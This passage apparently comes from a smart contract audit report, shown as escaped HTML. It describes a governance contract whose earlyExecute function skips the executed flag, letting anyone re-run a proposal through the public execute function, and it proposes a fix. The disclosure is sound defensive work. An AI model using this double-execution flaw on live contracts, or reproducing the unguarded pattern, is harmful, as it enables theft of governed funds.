class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_earlyExecutions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Proposal not ready for early execution\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// avoid reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_earlyExecutions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_executeOperations\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eProposalExecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs you can see, it uses the \u003ccode\u003e_earlyExecutions\u003c/code\u003e mapping to prevent the proposal from being executed a second time. The problem is that \u003ccode\u003e_executeOperations()\u003c/code\u003e does not set the \u003ccode\u003eexecuted\u003c/code\u003e flag to \u003ccode\u003etrue\u003c/code\u003e, as can be seen in the \u003ca href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L431-L433\"\u003ecomments\u003c/a\u003e of the function.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e* NOTE: Calling this function directly will NOT check the current state of the proposal, set the executed flag to\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e* true or emit the \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`ProposalExecuted`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e event. Executing a proposal should be done using {execute} or {_execute}.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e*/\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_executeOperations\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* proposalId */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/*descriptionHash*/\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; ++\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereturndata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{value: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]}(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003everifyCallResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereturndata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is problematic because a user can call \u003ca href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L390-L425\"\u003e\u003ccode\u003eexecute()\u003c/code\u003e\u003c/a\u003e from the \u003ccode\u003eGovernor.sol\u003c/code\u003e abstract contract to execute the proposal again, since \u003ccode\u003e_proposals[proposalId].executed\u003c/code\u003e is not set to \u003ccode\u003etrue\u003c/code\u003e, as shown in the \u003ccode\u003eexecute()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_encodeStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) | \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_encodeStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eQueued\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mark as executed before calls to avoid reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e///code...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs shown, \u003ccode\u003eexecuted\u003c/code\u003e is set to \u003ccode\u003etrue\u003c/code\u003e to prevent a proposal from being executed more than once. However, when \u003ccode\u003e_executeOperations()\u003c/code\u003e is used directly, this flag is not set. Since the \u003ccode\u003eexecute()\u003c/code\u003e function is public and not overridden to include access control, any user can call it, allowing the proposal to be executed a second time.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo resolve the issue, replace the call to \u003ccode\u003e_executeOperations()\u003c/code\u003e with a call to \u003ccode\u003eexecute()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction earlyExecute(uint256 proposalId) public payable onlyRole(EXECUTOR_ROLE) returns (uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            address[] memory targets,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            uint256[] memory values,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            bytes[] memory calldatas,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            bytes32 descriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = proposalDetails(proposalId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            state(proposalId) == ProposalState.Active \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                _voteSucceeded(proposalId) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                _quorumReached(proposalId) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                !_earlyExecutions[proposalId],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Proposal not ready for early execution\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // avoid 